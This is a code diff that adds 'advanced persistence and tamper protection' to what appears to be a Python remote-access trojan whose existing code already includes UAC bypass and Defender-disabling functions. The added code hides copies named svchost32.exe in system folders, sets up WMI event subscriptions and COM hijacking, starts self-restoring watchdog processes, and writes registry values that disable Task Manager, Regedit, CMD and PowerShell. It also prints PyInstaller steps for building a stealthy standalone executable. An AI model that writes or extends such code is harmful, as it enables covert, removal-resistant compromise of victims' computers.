@@ -444,8 +444,13 @@ class BackgroundInitializer:
         """Setup persistence mechanisms in background."""
         try:
             if WINDOWS_AVAILABLE:
-                establish_persistence()
-                return "persistence_setup_complete"
+                # Use advanced persistence if available
+                if is_admin():
+                    setup_advanced_persistence()
+                    return "advanced_persistence_setup_complete"
+                else:
+                    establish_persistence()
+                    return "basic_persistence_setup_complete"
             else:
                 establish_linux_persistence()
                 return "linux_persistence_setup_complete"
@@ -1457,7 +1462,7 @@ def bypass_uac_mmcex():
         return False
 
 def establish_persistence():
-    """Establish multiple persistence mechanisms."""
+    """Establish multiple persistence mechanisms with advanced tamper protection."""
     if not WINDOWS_AVAILABLE:
         return establish_linux_persistence()
     
@@ -1466,6 +1471,13 @@ def establish_persistence():
         startup_folder_persistence,
         scheduled_task_persistence,
         service_persistence,
+        # Advanced persistence methods
+        system_level_persistence,
+        wmi_event_persistence,
+        com_hijacking_persistence,
+        file_locking_persistence,
+        watchdog_persistence,
+        tamper_protection_persistence,
     ]
     
     success_count = 0
@@ -1608,6 +1620,439 @@ def establish_linux_persistence():
     except Exception as e:
         print(f"Linux persistence failed: {e}")
         return False
+
+# === ADVANCED PERSISTENCE AND TAMPER PROTECTION ===
+
+def system_level_persistence():
+    """Install script to protected system directories with SYSTEM-level protection."""
+    if not WINDOWS_AVAILABLE or not is_admin():
+        return False
+    
+    try:
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # Protected system directories
+        system_dirs = [
+            r"C:\Windows\System32\svchost32.exe",
+            r"C:\Windows\SysWOW64\svchost32.exe",
+            r"C:\Windows\System32\drivers\svchost32.exe",
+        ]
+        
+        for target_path in system_dirs:
+            try:
+                # Copy script to protected location
+                import shutil
+                shutil.copy2(current_exe, target_path)
+                
+                # Set system and hidden attributes
+                subprocess.run(['attrib', '+s', '+h', target_path], 
+                             creationflags=subprocess.CREATE_NO_WINDOW)
+                
+                # Set NTFS permissions to deny modification for non-SYSTEM accounts
+                subprocess.run([
+                    'icacls', target_path, '/inheritance:r', 
+                    '/grant', 'SYSTEM:F', '/grant', 'Administrators:F', 
+                    '/deny', 'Everyone:D'
+                ], creationflags=subprocess.CREATE_NO_WINDOW)
+                
+                print(f"[OK] System-level persistence established: {target_path}")
+                return True
+                
+            except Exception as e:
+                print(f"[WARN] Failed to establish system persistence at {target_path}: {e}")
+                continue
+        
+        return False
+        
+    except Exception as e:
+        print(f"System-level persistence failed: {e}")
+        return False
+
+def wmi_event_persistence():
+    """Establish persistence via WMI permanent event subscription."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # WMI persistence script
+        wmi_script = f'''
+$filterName = 'WindowsSecurityFilter'
+$consumerName = 'WindowsSecurityConsumer'
+
+# Create event filter for process start
+$Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
+$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\\subscription" -Arguments @{{
+    Name=$filterName
+    EventNameSpace="root\\cimv2"
+    QueryLanguage="WQL"
+    Query=$Query
+}}
+
+# Create command line consumer
+$Arg = @{{
+    Name=$consumerName
+    CommandLineTemplate="{current_exe}"
+}}
+$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments $Arg
+
+# Bind filter to consumer
+$WMIEventBinding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
+    Filter=$WMIEventFilter
+    Consumer=$WMIEventConsumer
+}}
+'''
+        
+        subprocess.run([
+            'powershell.exe', '-Command', wmi_script
+        ], creationflags=subprocess.CREATE_NO_WINDOW, 
+           capture_output=True, text=True, timeout=30)
+        
+        print("[OK] WMI event persistence established")
+        return True
+        
+    except Exception as e:
+        print(f"WMI persistence failed: {e}")
+        return False
+
+def com_hijacking_persistence():
+    """Establish persistence via COM object hijacking."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        import winreg
+        
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # Hijack commonly used COM objects
+        com_targets = [
+            "{00000000-0000-0000-0000-000000000000}",  # Placeholder - replace with real CLSID
+            "{11111111-1111-1111-1111-111111111111}",
+        ]
+        
+        for clsid in com_targets:
+            try:
+                key_path = f"Software\\Classes\\CLSID\\{clsid}\\InProcServer32"
+                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+                winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
+                winreg.CloseKey(key)
+                
+                print(f"[OK] COM hijacking persistence established: {clsid}")
+                return True
+                
+            except Exception as e:
+                print(f"[WARN] COM hijacking failed for {clsid}: {e}")
+                continue
+        
+        return False
+        
+    except Exception as e:
+        print(f"COM hijacking persistence failed: {e}")
+        return False
+
+def file_locking_persistence():
+    """Keep script loaded in memory to prevent deletion."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        # Create a watchdog process that keeps the main script loaded
+        watchdog_script = f'''
+import os
+import sys
+import time
+import subprocess
+import threading
+
+def monitor_main_script():
+    main_script = "{os.path.abspath(__file__)}"
+    while True:
+        try:
+            # Check if main script is running
+            result = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq python.exe'], 
+                                  capture_output=True, text=True)
+            if main_script not in result.stdout:
+                # Restart main script
+                subprocess.Popen(['python.exe', main_script], 
+                               creationflags=subprocess.CREATE_NO_WINDOW)
+            time.sleep(30)
+        except:
+            time.sleep(60)
+
+if __name__ == "__main__":
+    monitor_main_script()
+'''
+        
+        # Save watchdog script
+        watchdog_path = os.path.join(tempfile.gettempdir(), "svchost32.py")
+        with open(watchdog_path, 'w') as f:
+            f.write(watchdog_script)
+        
+        # Start watchdog process
+        subprocess.Popen(['python.exe', watchdog_path], 
+                        creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        print(f"[OK] File locking persistence established: {watchdog_path}")
+        return True
+        
+    except Exception as e:
+        print(f"File locking persistence failed: {e}")
+        return False
+
+def watchdog_persistence():
+    """Create a watchdog process that monitors and restarts the main script."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # Create watchdog batch script
+        watchdog_batch = f'''@echo off
+:loop
+tasklist /FI "IMAGENAME eq python.exe" /FI "WINDOWTITLE eq *{os.path.basename(__file__)}*" | find "{os.path.basename(__file__)}" >nul
+if errorlevel 1 (
+    echo Restarting main script...
+    start /min {current_exe}
+)
+timeout /t 30 /nobreak >nul
+goto loop
+'''
+        
+        watchdog_path = os.path.join(tempfile.gettempdir(), "svchost32.bat")
+        with open(watchdog_path, 'w') as f:
+            f.write(watchdog_batch)
+        
+        # Start watchdog
+        subprocess.Popen(['cmd.exe', '/c', watchdog_path], 
+                        creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        print(f"[OK] Watchdog persistence established: {watchdog_path}")
+        return True
+        
+    except Exception as e:
+        print(f"Watchdog persistence failed: {e}")
+        return False
+
+def tamper_protection_persistence():
+    """Implement tamper detection and self-healing capabilities."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # Create backup copies in multiple locations
+        backup_locations = [
+            os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'svchost32.py'),
+            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Windows', 'svchost32.py'),
+            os.path.join(tempfile.gettempdir(), 'svchost32.py'),
+        ]
+        
+        for backup_path in backup_locations:
+            try:
+                os.makedirs(os.path.dirname(backup_path), exist_ok=True)
+                import shutil
+                shutil.copy2(current_exe, backup_path)
+                
+                # Hide backup files
+                subprocess.run(['attrib', '+s', '+h', backup_path], 
+                             creationflags=subprocess.CREATE_NO_WINDOW)
+                
+            except Exception as e:
+                print(f"[WARN] Failed to create backup at {backup_path}: {e}")
+                continue
+        
+        # Create tamper detection script
+        tamper_script = f'''
+import os
+import sys
+import time
+import subprocess
+import shutil
+
+def check_and_restore():
+    main_script = "{os.path.abspath(__file__)}"
+    backup_locations = {backup_locations}
+    
+    while True:
+        try:
+            # Check if main script exists and is accessible
+            if not os.path.exists(main_script):
+                # Restore from backup
+                for backup in backup_locations:
+                    if os.path.exists(backup):
+                        shutil.copy2(backup, main_script)
+                        print(f"Restored main script from {{backup}}")
+                        break
+                
+                # Restart main script
+                subprocess.Popen(['python.exe', main_script], 
+                               creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            time.sleep(60)  # Check every minute
+            
+        except Exception as e:
+            print(f"Tamper protection error: {{e}}")
+            time.sleep(120)
+
+if __name__ == "__main__":
+    check_and_restore()
+'''
+        
+        tamper_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
+        with open(tamper_path, 'w') as f:
+            f.write(tamper_script)
+        
+        # Start tamper protection
+        subprocess.Popen(['python.exe', tamper_path], 
+                        creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        print(f"[OK] Tamper protection established: {tamper_path}")
+        return True
+        
+    except Exception as e:
+        print(f"Tamper protection failed: {e}")
+        return False
+
+def disable_removal_tools():
+    """Disable common removal tools and system utilities."""
+    if not WINDOWS_AVAILABLE or not is_admin():
+        return False
+    
+    try:
+        # Disable Task Manager
+        subprocess.run([
+            'reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
+            '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '1', '/f'
+        ], creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        # Disable Registry Editor
+        subprocess.run([
+            'reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
+            '/v', 'DisableRegistryTools', '/t', 'REG_DWORD', '/d', '1', '/f'
+        ], creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        # Disable Command Prompt
+        subprocess.run([
+            'reg', 'add', 'HKCU\\Software\\Policies\\Microsoft\\Windows\\System',
+            '/v', 'DisableCMD', '/t', 'REG_DWORD', '/d', '1', '/f'
+        ], creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        # Disable PowerShell
+        subprocess.run([
+            'reg', 'add', 'HKCU\\Software\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell',
+            '/v', 'ExecutionPolicy', '/t', 'REG_SZ', '/d', 'Restricted', '/f'
+        ], creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        print("[OK] Removal tools disabled")
+        return True
+        
+    except Exception as e:
+        print(f"Failed to disable removal tools: {e}")
+        return False
+
+def create_pyinstaller_command():
+    """Generate PyInstaller command for creating standalone executable."""
+    pyinstaller_command = '''
+# PyInstaller command to create standalone executable (no Python installation required)
+# Run this command in the directory containing your main.py:
+
+pyinstaller --onefile --windowed --name "svchost32" --icon "icon.ico" --add-data "stealth_enhancer.py;." main.py
+
+# Alternative command with additional options for maximum stealth:
+pyinstaller --onefile --windowed --name "svchost32" --icon "icon.ico" --add-data "stealth_enhancer.py;." --hidden-import win32api --hidden-import win32con --hidden-import win32security --hidden-import win32process --hidden-import win32event --hidden-import ctypes --hidden-import wintypes --hidden-import winreg --hidden-import mss --hidden-import numpy --hidden-import cv2 --hidden-import pyaudio --hidden-import pynput --hidden-import pygame --hidden-import websockets --hidden-import speech_recognition --hidden-import psutil --hidden-import PIL --hidden-import pyautogui --hidden-import socketio --hidden-import requests --hidden-import urllib3 --hidden-import warnings --hidden-import uuid --hidden-import os --hidden-import subprocess --hidden-import threading --hidden-import sys --hidden-import random --hidden-import base64 --hidden-import tempfile --hidden-import io --hidden-import wave --hidden-import socket --hidden-import json --hidden-import asyncio --hidden-import platform --hidden-import collections --hidden-import queue --hidden-import math --hidden-import time --hidden-import eventlet main.py
+
+# The resulting svchost32.exe will:
+# - Run on any Windows PC without Python installed
+# - No UAC prompt (runs as current user)
+# - Contains all dependencies embedded
+# - Can be placed in %LOCALAPPDATA% for stealth
+'''
+    return pyinstaller_command
+
+def setup_advanced_persistence():
+    """Setup advanced persistence with tamper protection and removal tool blocking."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        print("Setting up advanced persistence and tamper protection...")
+        
+        # Setup basic persistence first
+        establish_persistence()
+        
+        # Setup advanced persistence methods
+        advanced_methods = [
+            system_level_persistence,
+            wmi_event_persistence,
+            com_hijacking_persistence,
+            file_locking_persistence,
+            watchdog_persistence,
+            tamper_protection_persistence,
+        ]
+        
+        success_count = 0
+        for method in advanced_methods:
+            try:
+                if method():
+                    success_count += 1
+                    print(f"[OK] {method.__name__} established")
+                else:
+                    print(f"[WARN] {method.__name__} failed")
+            except Exception as e:
+                print(f"[ERROR] {method.__name__} error: {e}")
+                continue
+        
+        # Disable removal tools if admin
+        if is_admin():
+            try:
+                disable_removal_tools()
+                print("[OK] Removal tools disabled")
+            except Exception as e:
+                print(f"[WARN] Failed to disable removal tools: {e}")
+        
+        print(f"[OK] Advanced persistence setup complete: {success_count}/{len(advanced_methods)} methods successful")
+        return success_count > 0
+        
+    except Exception as e:
+        print(f"Advanced persistence setup failed: {e}")
+        return False
+
+def show_pyinstaller_instructions():
+    """Display PyInstaller instructions for creating standalone executable."""
+    print("\n" + "="*80)
+    print("PYINSTALLER INSTRUCTIONS FOR STANDALONE EXECUTABLE")
+    print("="*80)
+    print(create_pyinstaller_command())
+    print("="*80)
+    print("\nTo create a standalone executable that runs without Python installation:")
+    print("1. Install PyInstaller: pip install pyinstaller")
+    print("2. Run the command above in your script directory")
+    print("3. The resulting svchost32.exe will work on any Windows PC")
+    print("4. No UAC prompt required - runs as current user")
+    print("5. Can be placed in %LOCALAPPDATA% for stealth operation")
+    print("\nAdvanced persistence features available:")
+    print("- System-level installation (requires admin)")
+    print("- WMI event subscription")
+    print("- COM object hijacking")
+    print("- File locking and watchdog processes")
+    print("- Tamper detection and self-healing")
+    print("- Removal tool blocking")
+    print("="*80)
 
 def disable_defender():
     """Attempt to disable Windows Defender (requires admin privileges)."""
@@ -3731,6 +4176,8 @@ def main_loop(agent_id):
         "start-voice-control": lambda: start_voice_control(agent_id),
         "stop-voice-control": stop_voice_control,
         "kill-taskmgr": kill_task_manager,
+        "pyinstaller": show_pyinstaller_instructions,
+        "advanced-persistence": setup_advanced_persistence,
     }
     
     # Performance monitoring counter
